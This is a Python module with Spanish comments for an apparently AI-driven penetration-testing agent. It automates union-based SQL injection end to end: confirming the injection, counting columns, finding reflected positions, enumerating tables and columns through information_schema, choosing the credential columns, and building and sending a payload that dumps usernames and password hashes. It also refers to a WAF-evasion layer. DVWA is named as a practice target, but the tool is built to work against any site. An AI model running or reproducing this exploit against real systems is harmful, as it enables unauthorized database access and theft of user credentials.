"""Descubrimiento de esquema para SQL injection.

El agente AVERIGUA la estructura de la base de datos enviando consultas y leyendo las respuestas —
nunca asume la tabla ni las columnas. Es el mismo procedimiento de un pentester (o de sqlmap):
confirmar la inyección, aprender cuántas columnas hay, enumerar el esquema desde information_schema
y recién ahí extraer. La mecánica es determinista para que un modelo local pequeño sea fiable; la
única decisión que queda para el LLM es cuáles de las columnas descubiertas son las credenciales.

Habla con el exterior por un solo callback, `probe(sql) -> ProbeResult`, que envía una inyección
base y devuelve los valores reflejados. Quien lo usa conecta `probe` al motor de evasión + objetivo,
así el descubrimiento no depende de DVWA en concreto."""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Callable, Optional

_USER_HINTS = ("user", "login", "uname", "name", "email", "mail", "account")
_PASS_HINTS = ("pass", "pwd", "secret", "hash", "token", "credential")
_MAX_COLUMNS = 12


@dataclass
class ProbeResult:
    """Resultado de enviar una inyección base. `cells` son las filas con los valores que se ven en
    las columnas REFLEJADAS, en orden (cells[f][0] = valor de la primera posición reflejada)."""

    cells: list[list[str]] = field(default_factory=list)
    db_error: bool = False
    blocked: bool = False  # el WAF no se pudo evadir para esta prueba


@dataclass
class DiscoveryResult:
    injectable: bool = False
    quote: str = ""
    columns: int = 0
    reflected: list[int] = field(default_factory=list)
    tables: list[str] = field(default_factory=list)
    target_table: str = ""
    cred_columns: tuple[str, str] = ("", "")
    extracted: list[dict[str, str]] = field(default_factory=list)
    final_payload: str = ""
    trace: list[str] = field(default_factory=list)


Probe = Callable[[str], ProbeResult]
Picker = Callable[[str, list[str]], Optional[tuple[str, str]]]


def _hexlit(s: str) -> str:
    """Literal hexadecimal de MySQL, p. ej. 'users' -> 0x7573657273 (evita tener que usar comillas)."""
    return "0x" + s.encode("utf-8").hex()


def _best_match(columns: list[str], hints: tuple[str, ...]) -> str:
    """Prefiere una coincidencia exacta (p. ej. `user`), luego una subcadena que no sea columna id
    (así `user` gana a `user_id`)."""
    for c in columns:
        if c.lower() in hints:
            return c
    for c in columns:
        cl = c.lower()
        if any(h in cl for h in hints) and "id" not in cl:
            return c
    return ""


def pick_credential_columns(table: str, columns: list[str]) -> Optional[tuple[str, str]]:
    """Respaldo determinista para la única decisión: cuáles son usuario y contraseña."""
    user_col = _best_match(columns, _USER_HINTS)
    pass_col = _best_match(columns, _PASS_HINTS)
    if user_col and pass_col and user_col != pass_col:
        return user_col, pass_col
    return None


class SchemaDiscovery:
    def __init__(self, probe: Probe, say: Optional[Callable[[str], None]] = None,
                 pick: Picker = pick_credential_columns) -> None:
        self.probe = probe
        self.say = say or (lambda _m: None)
        self.pick = pick

    def discover(self) -> DiscoveryResult:
        """Averigua comillas, nº de columnas, columnas reflejadas, tablas y columnas de credenciales."""
        res = DiscoveryResult()

        # 1+2. Confirmar la inyección y contar columnas, probando contexto de cadena y luego entero.
        for quote in ("'", ""):
            first = self.probe(f"1{quote} ORDER BY 1-- -")
            if first.blocked or first.db_error:
                continue  # en el contexto correcto, ORDER BY 1 debe ser válido
            cols = _MAX_COLUMNS
            for n in range(2, _MAX_COLUMNS + 1):
                r = self.probe(f"1{quote} ORDER BY {n}-- -")
                if r.blocked:
                    cols = n - 1
                    break
                if r.db_error:
                    cols = n - 1
                    break
            if cols >= 1:
                res.injectable, res.quote, res.columns = True, quote, cols
                break
        res.trace.append(f"inyectable={res.injectable} comillas={res.quote!r} columnas={res.columns}")
        self.say(f"[Descubrimiento] inyectable={res.injectable} comillas={res.quote!r} columnas={res.columns}")
        if not res.injectable:
            return res

        # 3. Qué columnas se reflejan en la página (con marcadores numéricos únicos).
        sentinels = [str(1000 + i) for i in range(res.columns)]
        r = self.probe(f"-1{res.quote} UNION SELECT {','.join(sentinels)}-- -")
        flat = {c for row in r.cells for c in row}
        res.reflected = [i for i, s in enumerate(sentinels, start=1) if s in flat]
        res.trace.append(f"columnas reflejadas={res.reflected}")
        self.say(f"[Descubrimiento] columnas reflejadas={res.reflected}")
        if not res.reflected:
            return res

        # 4. Enumerar las tablas de la base de datos actual.
        res.tables = self._col0(self._single(res, "table_name",
            " FROM information_schema.tables WHERE table_schema=database()"))
        res.trace.append(f"tablas={res.tables}")
        self.say(f"[Descubrimiento] tablas={res.tables}")

        # 5. Por cada tabla, leer sus columnas y decidir si tiene credenciales.
        for table in res.tables or [""]:
            cols = self._col0(self._single(res, "column_name",
                f" FROM information_schema.columns WHERE table_name={_hexlit(table)}")) if table else []
            picked = self.pick(table, cols)
            res.trace.append(f"columnas de {table!r}={cols} -> credenciales={picked}")
            self.say(f"[Descubrimiento] columnas de {table!r}={cols} -> credenciales={picked}")
            if picked:
                res.target_table, res.cred_columns = table, picked
                break
        return res

    def build_dump_payload(self, res: DiscoveryResult) -> str:
        """Construye (de forma determinista) el payload de extracción desde el esquema descubierto."""
        user_col, pass_col = res.cred_columns
        return self._pair(res, user_col, pass_col, f" FROM {res.target_table}")

    def extract(self, payload: str, res: DiscoveryResult) -> list[dict[str, str]]:
        """Envía el payload de extracción y devuelve las filas (usuario, hash)."""
        r = self.probe(payload)
        rows = [{"username": row[0], "hash": row[1]} for row in r.cells if len(row) >= 2]
        res.final_payload = payload
        res.extracted = rows
        res.trace.append(f"extraidas {len(rows)} filas con {payload!r}")
        self.say(f"[Descubrimiento] extraidas {len(rows)} filas")
        return rows

    def run(self) -> DiscoveryResult:
        """Descubre y extrae en una pasada (útil para pruebas y uso directo)."""
        res = self.discover()
        if res.cred_columns[0]:
            self.extract(self.build_dump_payload(res), res)
        return res

    # --- constructores de payload: ponen la(s) expresión(es) en la(s) posición(es) reflejada(s) ---

    def _single(self, res: DiscoveryResult, expr: str, from_clause: str = "") -> str:
        pos = res.reflected[0]
        slots = [expr if i == pos else str(i) for i in range(1, res.columns + 1)]
        return f"-1{res.quote} UNION SELECT {','.join(slots)}{from_clause}-- -"

    def _pair(self, res: DiscoveryResult, e1: str, e2: str, from_clause: str = "") -> str:
        p1 = res.reflected[0]
        p2 = res.reflected[1] if len(res.reflected) > 1 else res.reflected[0]
        slots = []
        for i in range(1, res.columns + 1):
            slots.append(e1 if i == p1 else e2 if i == p2 else str(i))
        return f"-1{res.quote} UNION SELECT {','.join(slots)}{from_clause}-- -"

    def _col0(self, payload: str) -> list[str]:
        r = self.probe(payload)
        return [row[0] for row in r.cells if row]
